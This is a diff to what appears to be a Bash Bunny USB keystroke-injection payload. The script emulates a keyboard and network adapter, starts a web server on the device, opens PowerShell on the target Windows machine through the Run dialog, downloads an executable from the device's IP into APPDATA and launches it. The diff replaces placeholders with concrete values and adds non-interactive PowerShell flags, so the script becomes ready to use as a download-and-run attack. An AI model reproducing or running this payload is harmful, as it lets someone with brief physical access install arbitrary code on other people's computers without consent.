@@ -17,17 +17,17 @@ ATTACKMODE HID RNDIS_ETHERNET
 
 # Switch to hosting directory, spin up http server
 LED STAGE1
-cd /home/<directory>
+cd /home/draco
 gohttp -p 80 &
 
 # Open obfuscated cmd on target, downloads and runs payload (if successful). Exits cmd. 
 LED STAGE2
-WIN RUN r
-QUACK DELAY 300
-QUACK STRING "powershell.exe -NoExit -Command \"[console]::WindowHeight=1; [console]::WindowWidth=10\""
+Q GUI r
+QUACK DELAY 500
+QUACK STRING "powershell.exe -NoP -NonI -NoExit"
 QUACK ENTER
-QUACK DELAY 300
-QUACK STRING "Invoke-WebRequest -Uri \"http://<BBIP>/<payload>\" -OutFile \"$env:APPDATA\\<payload>\"; if ($?) { Write-Host \"Success!\" -ForegroundColor Green; Start-Sleep -Seconds 3; Start-Process \"env:APPDATA\\<payload>\"; exit } else { Write-Host \"Fail\" -ForegroundColor Red; Start-Sleep -Seconds 3; exit }"
+QUACK DELAY 500
+QUACK STRING "Invoke-WebRequest -Uri \"http://172.16.64.1/peepee.exe\" -OutFile \"\$env:APPDATA\\peepee.exe\"; if (\$?) { Write-Host \"Success!\" -ForegroundColor Green; Start-Sleep -Seconds 3; Start-Process \"\$env:APPDATA\\peepee.exe\"; exit } else { Write-Host \"Fail\" -ForegroundColor Red; Start-Sleep -Seconds 3}"
 QUACK ENTER
 
 LED FINISH
